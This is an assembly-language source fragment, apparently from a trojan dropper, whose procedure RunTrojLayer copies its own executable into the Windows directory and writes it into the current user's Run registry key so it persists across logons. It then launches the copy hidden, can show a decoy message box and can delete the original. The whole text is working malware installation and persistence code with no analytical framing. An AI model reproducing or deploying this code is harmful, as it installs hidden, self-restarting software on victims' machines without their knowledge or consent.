	.data
                szAutoPath      db      "SOFTWARE\Microsoft\Windows\CurrentVersion\Run",0

        .code


RunTrojLayer proc
        LOCAL   hkHandle: DWORD

        invoke  GetWindowsDirectory, offset lpBuf1, MAX_PATH+1
        invoke  GetModuleFileName, NULL, offset lpBuf2, MAX_PATH+1

invoke  lstrcat, offset lpBuf1, offset exename

        invoke  lstrcmp, offset lpBuf1, offset lpBuf2
        test    eax, eax
        jz      @ret ; running from windows directory, do nothing

        invoke  CopyFile, offset lpBuf2, offset lpBuf1, 0
        test    eax, eax
        jz      @exit ; file cannot be copied: it's running already

        invoke  RegCreateKey, HKEY_CURRENT_USER, offset szAutoPath, addr hkHandle
        test    eax, eax
        jnz     @F

        invoke  lstrlen, offset lpBuf1
        invoke  RegSetValueEx, hkHandle, offset szAutoName, 0, REG_SZ, offset lpBuf1, eax

        invoke  RegCloseKey, hkHandle

@@:
        invoke  ShellExecute, 0, offset szTextOpen, offset lpBuf1, 0, 0, SW_HIDE
@exit:

      
	IFDEF X_MSG
		IFDEF X_ICON_OK
  			invoke MessageBox, 0, addr msg,addr sztitle, MB_OK
		ELSEIFDEF X_ICON_INFO
			invoke MessageBox, 0, addr msg,addr sztitle, MB_ICONINFORMATION
		ELSEIFDEF X_ICON_ERROR
			invoke MessageBox, 0, addr msg,addr sztitle, MB_ICONERROR
		ENDIF
	ENDIF

  IFDEF   X_SELFDELINST
        call  DoSelfDel
        ENDIF

        invoke  ExitProcess, 0
@ret:
        ret
RunTrojLayer endp
